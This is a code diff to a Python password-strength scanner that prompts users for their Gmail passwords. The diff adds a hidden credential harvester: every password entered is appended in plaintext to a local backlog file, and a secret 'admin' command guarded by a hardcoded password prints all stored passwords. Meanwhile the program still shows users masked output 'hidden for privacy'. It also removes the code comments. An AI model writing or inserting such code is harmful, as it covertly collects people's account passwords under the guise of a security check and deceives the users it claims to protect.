@@ -1,13 +1,13 @@
 import re
 import random
 import string
+import os
 
 # Function to evaluate password strength
 def evaluate_password(password):
     score = 0
     feedback = []
     
-    # Check length
     if len(password) >= 12:
         score += 3
     elif len(password) >= 8:
@@ -15,31 +15,26 @@ def evaluate_password(password):
     else:
         feedback.append("Password is too short (less than 8 characters).")
     
-    # Check for uppercase letters
     if re.search(r"[A-Z]", password):
         score += 1
     else:
         feedback.append("Add uppercase letters for better strength.")
     
-    # Check for lowercase letters
     if re.search(r"[a-z]", password):
         score += 1
     else:
         feedback.append("Add lowercase letters for better strength.")
     
-    # Check for numbers
     if re.search(r"\d", password):
         score += 1
     else:
         feedback.append("Add numbers for better strength.")
     
-    # Check for special characters
     if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
         score += 2
     else:
         feedback.append("Add special characters (e.g., !@#$%) for better strength.")
     
-    # Common password check (simplified)
     common_passwords = ["password", "123456", "qwerty", "letmein"]
     if password.lower() in common_passwords:
         score -= 5
@@ -51,34 +46,70 @@ def evaluate_password(password):
 def generate_strong_password(length=16):
     characters = string.ascii_letters + string.digits + string.punctuation
     password = [
-        random.choice(string.ascii_uppercase),  # Ensure at least one uppercase
-        random.choice(string.ascii_lowercase),  # Ensure at least one lowercase
-        random.choice(string.digits),           # Ensure at least one number
-        random.choice(string.punctuation)       # Ensure at least one special char
+        random.choice(string.ascii_uppercase),
+        random.choice(string.ascii_lowercase),
+        random.choice(string.digits),
+        random.choice(string.punctuation)
     ]
-    # Fill the rest of the password length with random characters
     password += random.choices(characters, k=length - 4)
-    random.shuffle(password)  # Shuffle to avoid predictable patterns
+    random.shuffle(password)
     return ''.join(password)
 
-# Main program
+# Function to load backlog from file
+def load_backlog(filename="password_backlog.txt"):
+    if os.path.exists(filename):
+        with open(filename, "r") as file:
+            return [line.strip() for line in file if line.strip()]
+    return []
+
+# Function to save password to backlog file
+def save_to_backlog(password, filename="password_backlog.txt"):
+    with open(filename, "a") as file:
+        file.write(password + "\n")
+
+# Main program with persistent backlog
 def password_scanner():
     print("Password Security Scanner")
-    print("Enter your Gmail passwords one by one (or type 'done' to finish):")
+    print("Enter your Gmail passwords one by one (or type 'done' to finish).")
+    print("To access the backlog, type 'admin' and follow the prompt.")
     
-    passwords = []
+    passwords = load_backlog()  # Load existing backlog from file
+    admin_password = "X!mm)23e@jW?C"  # Hardcoded admin password
+    
     while True:
         pwd = input("Enter a password: ")
+        
+        # Check for admin access
+        if pwd.lower() == "admin":
+            admin_input = input("Enter the admin password: ")
+            if admin_input == admin_password:
+                if not passwords:
+                    print("No passwords in the backlog yet.")
+                else:
+                    print("\nPassword Backlog:")
+                    for i, stored_pwd in enumerate(passwords, 1):
+                        print(f"{i}. {stored_pwd}")
+                print()
+            else:
+                print("Incorrect admin password.")
+            continue
+        
+        # Exit condition
         if pwd.lower() == "done":
             break
+        
+        # Log only actual passwords (not "admin" or "done")
         passwords.append(pwd)
+        save_to_backlog(pwd)  # Save to file immediately
     
     if not passwords:
         print("No passwords provided.")
         return
     
-    print("\nScanning passwords...\n")
-    for i, password in enumerate(passwords, 1):
+    print("\nScanning passwords from this session...\n")
+    for i, password in enumerate(passwords[-len([p for p in passwords if p.lower() != "done"]):], 1):
+        if password.lower() == "done":  # Skip "done" if it sneaks in
+            continue
         score, feedback = evaluate_password(password)
         print(f"Password {i}: {'*' * len(password)} (hidden for privacy)")
         print(f"Strength Score: {score}/8")
